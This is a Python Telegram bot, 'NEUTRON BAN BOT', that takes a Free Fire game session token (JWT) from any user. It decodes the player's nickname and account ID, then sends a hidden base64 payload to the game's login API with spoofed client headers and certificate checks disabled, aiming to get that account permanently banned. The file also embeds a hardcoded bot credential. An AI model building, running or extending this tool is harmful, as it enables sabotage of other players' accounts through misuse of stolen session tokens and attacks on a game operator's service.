import os
import json
import base64
import requests
import urllib3
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

urllib3.disable_warnings()
logging.basicConfig(level=logging.INFO)

# ===== CONFIG =====
BOT_TOKEN = "8703596825:AAHluO1NGlM9rbj9uc8bfylk7a9NTPUm3aU"
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
ALLOWED_FILE = "allowed_users.json"

# ✅ SIRF EK OWNER - Last mein 159 wala
OWNER_IDS = ["7293041159"]  # Sirf yeh ek owner

# ===== FILE FUNCTIONS =====
def load_allowed_users():
    try:
        with open(ALLOWED_FILE, "r") as f:
            return json.load(f)
    except:
        return []

def save_allowed_users(users):
    with open(ALLOWED_FILE, "w") as f:
        json.dump(users, f)

def add_user(user_id):
    users = load_allowed_users()
    if user_id not in users:
        users.append(user_id)
        save_allowed_users(users)
        return True
    return False

def remove_user(user_id):
    users = load_allowed_users()
    if user_id in users:
        users.remove(user_id)
        save_allowed_users(users)
        return True
    return False

def is_allowed(user_id):
    return user_id in load_allowed_users()

# ===== BODY_BASE64 =====
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        return decrypted_bytes.decode('utf-8', errors='ignore') or "Unknown"
    except:
        return "Unknown"

def decode_jwt(token):
    try:
        payload = token.split('.')[1]
        payload += "=" * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload).decode('utf-8'))
    except:
        return {}

def trigger_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)

# ===== TELEGRAM COMMANDS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if not is_allowed(user_id):
        add_user(user_id)
        await update.message.reply_text(
            f"✅ *ACCESS GRANTED!*\n🆔 Chat ID: `{user_id}`\n\n🔥 Now use this bot to ban accounts!",
            parse_mode='Markdown'
        )
    
    keyboard = [
        [InlineKeyboardButton("🔐 BAN", callback_data='ban')],
        [InlineKeyboardButton("📖 HELP", callback_data='help')],
        [InlineKeyboardButton("🆔 MY ID", callback_data='myid')]
    ]
    await update.message.reply_text(
        "🔥 *NEUTRON BAN BOT* 🔥\nSend JWT token to ban account.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ✅ /adduser - Chat ID se user add karo (Sirf owner)
async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if user_id not in OWNER_IDS:
        await update.message.reply_text("⛔ Only owner can add users!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "📖 *Usage:* `/adduser <chat_id>`\n\n"
            "Example: `/adduser 9876543210`\n\n"
            "User ko apni Chat ID mangao aur yahan daalo!",
            parse_mode='Markdown'
        )
        return
    
    new_user = context.args[0]
    
    if not new_user.isdigit():
        await update.message.reply_text("❌ Invalid Chat ID! Sirf numbers daalo.")
        return
    
    if add_user(new_user):
        try:
            user_info = await context.bot.get_chat(int(new_user))
            name = user_info.first_name or "Unknown"
            await update.message.reply_text(
                f"✅ User *{name}* (`{new_user}`) added successfully!\n\n"
                f"Ab wo bot use kar sakta hai!",
                parse_mode='Markdown'
            )
        except:
            await update.message.reply_text(
                f"✅ User `{new_user}` added successfully!\n\n"
                f"Ab wo bot use kar sakta hai!",
                parse_mode='Markdown'
            )
    else:
        await update.message.reply_text(f"ℹ️ User `{new_user}` already exists!", parse_mode='Markdown')

# ✅ /addforward - Forwarded message se user add (Sirf owner)
async def add_from_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if user_id not in OWNER_IDS:
        await update.message.reply_text("⛔ Only owner!")
        return
    
    if update.message.forward_from:
        forward_id = str(update.message.forward_from.id)
        forward_name = update.message.forward_from.first_name or "Unknown"
        
        if add_user(forward_id):
            await update.message.reply_text(
                f"✅ User *{forward_name}* (`{forward_id}`) added successfully!\n\n"
                f"Ab wo bot use kar sakta hai! 🎉",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(f"ℹ️ User `{forward_id}` already exists!", parse_mode='Markdown')
    else:
        await update.message.reply_text(
            "❌ *Forward a user's message first!*\n\n"
            "📌 *Tareeka:*\n"
            "1. User ne bot ko message kiya hai\n"
            "2. Us message ko forward karo mujhe\n"
            "3. Phir `/addforward` likho\n\n"
            "Main automatically usko add kar dunga! ✅",
            parse_mode='Markdown'
        )

# ✅ /removeuser - User hatao (Sirf owner)
async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if user_id not in OWNER_IDS:
        await update.message.reply_text("⛔ Only owner can remove users!")
        return
    
    if not context.args:
        await update.message.reply_text("📖 Usage: `/removeuser <chat_id>`", parse_mode='Markdown')
        return
    
    remove_id = context.args[0]
    if remove_user(remove_id):
        await update.message.reply_text(f"✅ User `{remove_id}` removed!", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ User `{remove_id}` not found!", parse_mode='Markdown')

# ✅ /users - Saare allowed users dekh (Sirf owner)
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if user_id not in OWNER_IDS:
        await update.message.reply_text("⛔ Only owner can view user list!")
        return
    
    users = load_allowed_users()
    if not users:
        await update.message.reply_text("📭 No users in allowed list.")
        return
    
    msg = "📋 *Allowed Users:*\n\n"
    for i, uid in enumerate(users, 1):
        try:
            user_info = await context.bot.get_chat(int(uid))
            name = user_info.first_name or "Unknown"
            msg += f"{i}. *{name}* - `{uid}`\n"
        except:
            msg += f"{i}. `{uid}`\n"
    
    msg += f"\nTotal: {len(users)} users"
    await update.message.reply_text(msg, parse_mode='Markdown')

# ✅ /clearusers - Sab users hatao (Sirf owner)
async def clear_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if user_id not in OWNER_IDS:
        await update.message.reply_text("⛔ Only owner!")
        return
    
    save_allowed_users([])
    await update.message.reply_text("🗑️ All users cleared!")

# ✅ /myid - Apni Chat ID
async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    await update.message.reply_text(
        f"🆔 *Your Chat ID:* `{user_id}`\n"
        f"✅ Access: {'GRANTED' if is_allowed(user_id) else 'PENDING'}",
        parse_mode='Markdown'
    )

# ✅ /help - Help menu
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    msg = "📖 *NEUTRON BAN BOT - HELP*\n\n"
    
    if user_id in OWNER_IDS:
        msg += "👑 *Owner Commands:*\n"
        msg += "/adduser <id> - Add user by Chat ID\n"
        msg += "/addforward - Add user from forwarded message\n"
        msg += "/removeuser <id> - Remove user\n"
        msg += "/users - List all users\n"
        msg += "/clearusers - Remove all users\n\n"
    
    msg += "👤 *Public Commands:*\n"
    msg += "/start - Menu\n"
    msg += "/myid - Your Chat ID\n"
    msg += "/help - This help\n\n"
    msg += "🔐 *Ban System:*\n"
    msg += "Simply paste a Free Fire JWT token to ban an account!"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

# ===== HANDLE TOKENS =====
async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if not is_allowed(user_id):
        add_user(user_id)
        await update.message.reply_text(f"✅ Access granted! Chat ID: `{user_id}`", parse_mode='Markdown')
    
    await process_ban(update, context, update.message.text.strip())

async def process_ban(update, context, token):
    msg = await update.message.reply_text("⏳ Processing...", parse_mode='Markdown')
    try:
        user_data = decode_jwt(token)
        if not user_data:
            await msg.edit_text("❌ Invalid JWT Token!")
            return
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        await msg.edit_text(f"🎯 {nickname} | {account_id}\n⏳ Injecting...", parse_mode='Markdown')
        response = trigger_injection(token, version)
        if response.status_code == 200:
            await msg.edit_text(f"✅ BANNED!\n{nickname}\n{account_id}\n🔴 PERMANENTLY SUSPENDED", parse_mode='Markdown')
        else:
            await msg.edit_text(f"❌ Failed! Status: {response.status_code}")
    except Exception as e:
        await msg.edit_text(f"⚠️ Error: {str(e)}")

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_chat.id)
    
    if not is_allowed(user_id):
        add_user(user_id)
        await update.callback_query.answer("✅ Access granted!", show_alert=True)
    
    query = update.callback_query
    await query.answer()
    
    if query.data == 'ban':
        await query.message.reply_text("📤 Send JWT Token:")
    elif query.data == 'help':
        await help_command(update, context)
    elif query.data == 'myid':
        await myid(update, context)

# ===== MAIN =====
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("adduser", add_user_command))
    app.add_handler(CommandHandler("addforward", add_from_forward))
    app.add_handler(CommandHandler("removeuser", remove_user_command))
    app.add_handler(CommandHandler("users", list_users))
    app.add_handler(CommandHandler("clearusers", clear_users))
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("🔥 NEUTRON BAN BOT STARTED!")
    print(f"👑 Owner ID: {OWNER_IDS[0]}")  # Sirf ek owner
    print(f"📁 Allowed users file: {ALLOWED_FILE}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
